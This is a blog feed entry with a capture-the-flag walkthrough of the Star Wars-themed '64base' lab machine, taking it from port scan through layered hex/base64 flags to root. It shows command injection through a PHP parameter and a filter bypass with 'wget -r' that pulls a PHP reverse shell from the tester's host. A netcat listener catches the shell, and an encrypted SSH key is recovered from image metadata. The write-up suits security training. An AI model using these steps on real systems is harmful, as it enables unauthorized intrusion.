<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-10-27T13:22:48-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[All your 64Base are belong to us]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us/"/>
    <updated>2018-10-26T15:14:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us</id>
    <content type="html"><![CDATA[<p>This machine is based on Star Wars. The goal is &ldquo;to Beat the Empire and steal the plans for the Death Star before its too late.&rdquo;. For this to happen, 6 flags encoded in base64 need to be collected.</p>

<p><a href="https://www.youtube.com/watch?v=v8MqvUeDqL4">I AM THE EMPIRE!</a></p>

<!-- more -->


<p><code>
PORT      STATE SERVICE VERSION
22/tcp    open  ssh?
| fingerprint-strings:
|   GenericLines, NULL:
|     The programs included with the Fedora GNU/Linux system are free software;
|     exact distribution terms for each program are described in the
|     individual files in /usr/share/doc/*/copyright.
|     Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
|     permitted by applicable law.
|_    Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 429 disallowed entries (15 shown)
| /administrator/ /admin/ /login/ /88888/ /88888888/
| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/
|_/across/ /activation/ /Adjustments/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: 64base
4899/tcp  open  radmin?
| fingerprint-strings:
|   NULL:
|     sshhh! ssh! droids!
|     So..
|     found a way in then...
|     but, can you pop root?
|     /~\n |oo ) Did you hear that?
|     _=/_
|     ()\x20 //|/.\|\
|     _|_____|_ \ _/ ||
|     \|\x20/| ||
|     ||__*__|| | | |
|     ___/ ~| []|[]
|     /=\x20/=\x20/=\x20 | | |
|_    ________________[_]_[_]_[_]________/_]_[__________________________
62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
|   256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)
|_  256 e0:45:24:da:a1:2d:8a:21:c8:cf:98:4b:7f:42:e7:d4 (ED25519)
</code></p>

<p>The first red herring is SSH on port 22. If you try connecting to it, it looks like it gives you a root shell, and then it closes the connection. There is no SSH there:</p>

<p>```
nc -vn 192.168.145.138 22
(UNKNOWN) [192.168.145.138] 22 (ssh) open
The programs included with the Fedora GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001</p>

<p>#
id
```</p>

<p>Then there is port 4899, which shows some ASCII art, but nothing seems to happen otherwise:</p>

<p>```
You found a way in then&hellip;</p>

<p>but, can you pop root?</p>

<pre><code>                                       /~\
                                      |oo )    Did you hear that?
                                      _\=/_
                      ___            /  _  \
                     / ()\          //|/.\|\\
                   _|_____|_        \\ \_/  ||
                  | | === | |        \|\ /| ||
                  |_|  O  |_|        # _ _/ #
                   ||  O  ||          | | |
                   ||__*__||          | | |
                  |~ \___/ ~|         []|[]
                  /=\ /=\ /=\         | | |
  ________________[_]_[_]_[_]________/_]_[_\_________________________
</code></pre>

<p>```</p>

<h2>Flag #1 &ndash; Decode and decode some more</h2>

<p>The web server takes us to Lord Vader&rsquo;s blog:</p>

<p><img class="center" src="/images/pentest/64base/blog.png" title="&lsquo;blog&rsquo; &lsquo;vader blog&rsquo;" ></p>

<p>You probably noticed that weird string, <em>dmlldyBzb3VyY2UgO0QK</em>. If you look in the HTML source, you will find a comment following it:</p>

<p>```</p>

<!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a-->


<p>```</p>

<p>It&rsquo;s hex encoded, and decoding it gives a&hellip;I&rsquo;m sure you expect it by now&hellip;base64 string:</p>

<p><code>
ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==
</code></p>

<p>Decoding this gives the 1st flag: <code>flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}</code>, and further decoding the flag leaves us with what look like credentials for something: <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code></p>

<h2>Flag #2 &ndash; Imperial class bounty hunter</h2>

<p>If you browse the pages you can read some Star Wars centric posts. I didn&rsquo;t go through them thoroughly, but I did notice a relevant hint in a picture for something that might come up later:</p>

<p><img class="center" src="/images/pentest/64base/hint.jpg" title="&lsquo;hint&rsquo; &lsquo;shell hint&rsquo;" ></p>

<p>So..when we&rsquo;ll reach the point of getting a shell, we&rsquo;ll have to use <em>system</em> instead of <em>exec</em>. Cool..now it&rsquo;s time to look inside that massive robots.txt. There are too many entries to show and the few I&rsquo;ve tried were blank. Under <em>/admin</em> there&rsquo;s basic authentication, but the credentials from the first flag didn&rsquo;t work. Some attention to detail is required for this one. In the above picture, there is another important hint that I&rsquo;ve overlooked: <em>Only respond if you are a real Imperial-Class BountyHunter</em>. Within the plethora of robots.txt entries there is this:</p>

<p><code>
Disallow: /Imperial-class/
</code></p>

<p>Useless like the others, but the message said <em>Imperial-Class</em>..could it be that one capital letter would make the difference? I tried <a href="http://192.168.145.138/Imperial-Class/">http://192.168.145.138/Imperial-Class/</a> and another basic authentication box popped up, and this time the credentials worked!</p>

<p><img class="center" src="/images/pentest/64base/error.jpg" title="&lsquo;error&rsquo; &lsquo;error&rsquo;" ></p>

<p>It looks like a dead end, but the source is with us:</p>

<p>```</p>

<!-- don't forget the BountyHunter login -->


<p>```</p>

<p>Adding this part to the URL (<em>Imperial-Class/BountyHunter</em>) takes us to a login page:</p>

<p><img class="center" src="/images/pentest/64base/login.jpg" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>The force..source to the rescue again! If you view the source, you will notice another 3 hex strings:</p>

<p><code>
5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
</code></p>

<p>Decoding them as a block gives us another base64 string:</p>

<p><code>
ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=
</code></p>

<p>And decoding this gives the second flag: <code>flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}</code>. But it&rsquo;s the inside that matters, and it&rsquo;s actually a <a href="https://www.youtube.com/watch?v=vJwytFWA8uA">link to Youtube</a></p>

<p><img class="center" src="/images/pentest/64base/burp.png" title="&lsquo;burp&rsquo; &lsquo;burp&rsquo;" ></p>

<p>So we&rsquo;ll have to use Burp for the next part.</p>

<h2>Flag #3 &ndash; Burp'ing for the empire</h2>

<p>I&rsquo;ve put some dummy values in the login form and intercepted the requests with Burp..it&rsquo;s important to also capture the server response, because the flag is in the 302 Moved Temporarily response from the server: <code>flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}</code>. And decoding it shows the way to the secret shell that was hinted at previously: <code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</code></p>

<h2>Flag #4 &ndash; System, not exec</h2>

<p>Going to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id">http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</a> takes us to a page that only has the text &ldquo;[64base Command Shell]&rdquo; displayed on it. Trying different commands for the <em>c</em> parameter doesn&rsquo;t change anything, but we have the tip from before. So I switched to <strong>?f=system&amp;c=id</strong> and got the flag and the command output:</p>

<p>```
flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}</p>

<p>Debian GNU/Linux 8 \n \l</p>

<p>Sat Oct 27 16:05:00 BST 2018
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux</p>

<pre><code>      inet addr:192.168.145.138  Bcast:192.168.145.255  Mask:255.255.255.0
      inet6 addr: fe80::20c:29ff:fe0a:a6d1/64 Scope:Link
</code></pre>

<p>uid=1001(64base) gid=1001(64base) groups=1001(64base)
```</p>

<p>Decoding the flag gives another set of possible credentials: <code>64base:64base5h377</code>. Tried them on the SSH with no success.</p>

<h2>Flag #5 &ndash; When nothing else works, recurse!</h2>

<p>Even though it looks like we have a shell, in reality, many commands don&rsquo;t work. At this point, I looked at a hint from other solutions to understand what is going on. It seems there is some filtering in place, and you can see what is being filtered by using PHP&rsquo;s <strong>var_dump</strong> function, which displays structured information (type and value) about variables. I tried downloading a reverse shell from my system with <code>?f=system&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, but of course it didn&rsquo;t work. However, when I tried looking at how the command is constructed with <code>?f=var_dump&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, I saw what was filtered out:</p>

<p><code>
string(190) "echo '
flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
';cat.real /etc/issue;date;uname -a;/sbin/ifconfig eth0|/usr/share/grep.real inet;echo
 sudo -u 64base wget http192.168.145.1338001shell.php"
</code></p>

<p>The slash and colon characters are filtered out. I played with it and saw that other special characters are also filtered out, so I couldn&rsquo;t use command chaining to get rid of it. I could not point wget to my server that with the shell. But wget has the option of recursive downloading, with the <em>-r</em> switch. If I could serve the shell in the root of my web server, it should be recursively downloaded, since there would be no blacklisted characters in the command. So I used Python&rsquo;s SimpleHTTPServer to serve the shell on port 80 and tested the recursive download from my machine, and it created a directory corresponding with the one downloaded, with the shell inside:</p>

<p>```
wget -r 192.168.145.133
&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/">http://192.168.145.133/</a>
Connecting to 192.168.145.133:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 216 [text/html]
Saving to: ‘192.168.145.133/index.html’</p>

<p>192.168.145.133/index.html            100%[======================================================================>]     216  &mdash;.-KB/s    in 0s</p>

<p>2018-10-27 10:03:58 (11.8 MB/s) &ndash; ‘192.168.145.133/index.html’ saved [216/216]</p>

<p>Loading robots.txt; please ignore errors.
&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/robots.txt">http://192.168.145.133/robots.txt</a>
Connecting to 192.168.145.133:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 404 File not found
2018-10-27 10:03:58 ERROR 404: File not found.</p>

<p>&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/shell.php">http://192.168.145.133/shell.php</a>
Connecting to 192.168.145.133:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 5497 (5.4K) [application/octet-stream]
Saving to: ‘192.168.145.133/shell.php’</p>

<p>192.168.145.133/shell.php             100%[======================================================================>]   5.37K  &mdash;.-KB/s    in 0s</p>

<p>2018-10-27 10:03:58 (638 MB/s) &ndash; ‘192.168.145.133/shell.php’ saved [5497/5497]</p>

<p>FINISHED &mdash;2018-10-27 10:03:58&mdash;
Total wall clock time: 0.01s
Downloaded: 2 files, 5.6K in 0s (212 MB/s)
```</p>

<p>I made the change and dumped the variable as it looks now:</p>

<p><code>
sudo -u 64base wget -r 192.168.145.138
</code></p>

<p>Things are looking good. But when I ran it, still nothing happened, and there was no GET request downloading the shell on my Python server. After more time spent dumping variations of the command, the one that finally worked was <code>?f=system&amp;c=ls | wget -r 192.168.145.133</code></p>

<p>Now my server received a request, and when I listed the current directory:</p>

<p><code>
total 48K
drwxr-xr-x 6 www-data www-data 4.0K Oct 27 18:12 .
drwxr-xr-x 3 www-data www-data 4.0K Dec  6  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Oct 27 18:12 192.168.145.133
-rwxr-x--- 1 www-data www-data 2.1K Dec  5  2016 cat
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 css
-rwxr-x--- 1 www-data www-data  757 Dec  6  2016 index.html
-rwxr-x--- 1 www-data www-data  705 Dec  5  2016 index.jade
-rwxr-x--- 1 www-data www-data  959 Dec  6  2016 index.php
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 js
-rwxr-x--- 1 www-data www-data 1.1K Dec  5  2016 license.txt
-rwxr-x--- 1 www-data www-data  835 Dec  6  2016 login.php
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 scss
</code></p>

<p>Navigating to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php">http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php</a> served me the shell on my listener:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.145.133] from (UNKNOWN) [192.168.145.138] 45307
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
 18:44:14 up  4:27,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'      
www-data@64base:/$
</code></p>

<p>I looked around and saw more ASCII art files, then I ran a quick search for the flag:</p>

<p><code>
www-data@64base:/$ find / -name flag* 2&gt;/dev/null
/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}
</code></p>

<p>And the hint for the last flag is <code>Look Inside! :D</code>.</p>

<h2>Flag #6 &ndash; Use the force</h2>

<p>Running file on the found file shows that it&rsquo;s a JPEG image:</p>

<p><code>
JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3
</code></p>

<p>There is hex in the comment, I decoded it to <code>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSB</code>. Then I passed this through a base64 decoder and it gave me the beginning of an SSH private key:</p>

<p><code>
-----BEGIN RSA PRIVATE
</code></p>

<p>I needed to take a better look at this, so I downloaded it to my machine:</p>

<p><img class="center" src="/images/pentest/64base/flag.jpg" title="&lsquo;flag&rsquo; &lsquo;flag5&rsquo;" ></p>

<p>And then I ran exiftool on it and the comment string was actually huge. So there must be a complete private key in there. So I went again through the hex and bas64 decoding process, to get the key:</p>

<p>```
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C</p>

<p>mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>

<p>```
ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x34;&#53;&#46;&#49;&#x33;&#x38;">&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#52;&#x35;&#x2e;&#x31;&#x33;&#56;</a> -p 62964 -i ssh.key
Enter passphrase for key &lsquo;ssh.key&rsquo;:</p>

<p>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18</p>

<p>flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
root@64base:~#
```</p>

<p>Almost over, because that flag required several decoding cycles before it gave me something usable: <code>base64 -d /var/local/.luke|less.real</code>. With that, I ran it and got the mission success message, which will take a couple of minutes to read:</p>

<p>```</p>

<pre><code>     __          __  _ _   _____                      
     \ \        / / | | | |  __ \                     
      \ \  /\  / /__| | | | |  | | ___  _ __   ___    
       \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \   
        \  /\  /  __/ | | | |__| | (_) | | | |  __/   
     __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _ 
     \ \   / /          |  __ \(_)   | | |_   _| | | |
      \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
       \   / _ \| | | | | |  | | |/ _` |   | | | __| |
        | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
        |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)
</code></pre>

<hr />

<p>%=x%= | |V| |<em>)|</em> |<em>) | |</em>| |   |<em>) |</em>| (<em>  |</em>  |<em>) |  |</em>| |\| (<em>  %=x%=x%=x
~~~~~ | | | |  |</em> | \ | | | |<em>  |</em>) | | <strong>) |<em>  |   |</em> | | | | </strong>) ~~~~~~~~~
LS</p>

<pre><code>             .-. .-.
           .=========.         E x t e r i o r ,   A e r i a l   V i e w
           ||.-.7.-.||         -----------------------------------------
           ||`-' `-'||
           `========='
            `-'| |`-'8               1 .............. Sensor Suite Tower
      ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
     /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
    /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
   /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
   \____\\`==========='//____/       6 .................... Guard towers
   /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
__/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
</code></pre>

<p>   /\ \    ///x<code>.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
  /  \ \  //</code>&ndash;.<em>//|   |\</em>.2'\  / /  \
 /  <em>.&ndash;===&lsquo;</em><strong><strong>//.&ndash;=&ndash;.\</strong></strong><em><code>===-._  \
 \  </code>&ndash;===.-.  \ `&ndash;=1&rsquo; /  .&ndash;/.===&ndash;&lsquo; 3 / The pre-fabricated,  multi-function
  \  / /  \\ \  .===./  /4///  \ \  /  Imperial garrison base is the back-
   \/</em>/    \\ | /.&mdash;&ndash;.\ | ///    _\/   bone of the  Empire&rsquo;s  occupational</p>

<pre><code>  \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
   \_____\=============/_____/       tresses have  walls up to 10 meters
   /____///    ___    \\\____\       thick  to  guard   against   ground
   \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
    \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
     \_____|  | 5 | 6|_____/         space attacks.
           `--'   `--'
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                       U           E x t e r i o r ,   S i d e   V i e w
                      /_\          -------------------------------------
                   1 [___]
                     :`:':           1 .............. Sensor Suite Tower
                     `:::'           2 ... Heavy Twin Turbolaser Turrets
              _       :_:       _    3 ............. Heavy Laser Turrets
            =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
             :=:      :=:      :=:   5 ............... Heavy Blast Doors
            _|_|_   __| |__   _|_|_  6 .................... Guard Towers
           / /XX|\ /__|_|__\ /|XX\ \
     3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
--===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
 /__| |     /l_\\             //_|\     |_|__\
/~~.' |    /:'  \\   _____   //  `:\    | `.  \
</code></pre>

<p>   /   | .&lsquo;   / |    \==|||||==//    | \   <code>. |   \   7    8
  /   .' |   / .'     |  ||5|| 6|    </code>. \   | `.   \  xx=   _
 /<em><em><strong>|</strong>|<strong>/</strong>|</em></em><em><em><strong>l</strong>|||||<strong>l</strong></em></em><strong>|</strong>_<em>|<strong>|</strong></em>_\ ll   &lt;~</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                             O u t e r   D e f e n s e s
        |                      |             ---------------------------
     ^_[]_^                 ^_[]_^
     |----|               5 |----|        1 ... High Voltage Death Fence
</code></pre>

<p> <strong><strong><strong>__<code>-..-'________4________</code>&ndash;..&ndash;&lsquo;</strong></strong></strong>  2 &hellip;&hellip;. Perimeter Gate House
 ===========================================  3 &hellip;&hellip;.. Powered Force Field</p>

<pre><code>      `||'                   `||'         4 .......... Fortified Catwalk
       ||     ^==^   ^==^     ||          5 ......... Observattion tower
</code></pre>

<p> <em><strong>.</strong>__.</em>ll<em>.</em>1<em>|&mdash;|   |&mdash;|</em><strong>.<em>ll</em>.</strong><strong>.</strong>__
 XXX|XXXX|XIIX|XXX|&mdash;| 3 |&mdash;|XXX|XIIX|XXXX|XXXX
 XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX</p>

<p> The outer perimeter is  marked  by a  high-voltage  &ldquo;death fence.&rdquo;  Powered
 Force fields  placed at regular intervals along the fence may be turned off
 to permit entry and exit.  Observation towers,  connected by fortified cat-
 walks,  are set back from the fence and constantly manned by stormtroopers.
 Other outer  defenses  include energy mine fields,  modified patrol Droids,
 and AT-ST Scout Walkers.</p>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>         _
        /|                               L a n d i n g   P l a t f o r m
      -==+                               -------------------------------
        :
     [__________]               Up to two Lambda-class shuttles and four
     `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
       ========  =xx            A loading  ramp  leads directly from the
        ||  ||    ll            platform into the garrison complex.
 ~~~~~~~~~~~~~~~~~~~~~~
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<pre><code>                                 I n t e r i o r ,   L e v e l s   1 - 5
                                 ---------------------------------------

      ______         ______      The first 5 levels of the garrison com-
     / ____ \_______/ ____ \     plex are of identical layout, construc-
    / /    \_________/    \ \    ted  around  a  level-spanning  surface
   / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
   \ \       \_____/_______/ /   determine what each level contains.
   / /    o   |o o|   o    \ \
__/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
</code></pre>

<p>   / <strong>/      .&lsquo; .<em>o_o</em>. <code>.      \__ \         Armory (levels 3-4), Training
  / / </code>&ndash;.  .&rsquo; .&lsquo;  10   <code>.</code>.  .&ndash;&rsquo;  \ \        Facilities   and   Recreation
 / /      ~&lsquo; .&rsquo;<code>-._____.-'</code>. `~      \ \       Rooms (level 5)
 \ \     o  &lt;  C  | | |  D  >  o  7  / / 2 &hellip; Stormtrooper Barracks (levels
  \ __      \    &lsquo; &rsquo; &lsquo;    /      </strong>/ /        1-3),    Security    Barracks
   _<em> \  1  |&mdash;&mdash;  9  &mdash;&mdash;|~&ndash;.</em> / __/         (levels 4-5)</p>

<pre><code>  \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
   \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
   / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
   \ \      | |   | |      / /       6 ... Technical and Service Person-
    \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
     \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
           `--'   `--'                     Medical   Bay    (level   3),
                                           Science Labs (levels 4-5)
            8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
            9 ...................... Surface Vehicle  Bay  (levels 1-5):
            A .................................. AT-ST Scout Walker Bays
            B ........................................ AT-AT Walker Bays
            C ...................... Vehicle Maintenance and Repair Deck
            D ........................................ Speeder Bike Deck
            10 ........................... Miscellaneous Vehicle Parking
</code></pre>

<hr />

<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

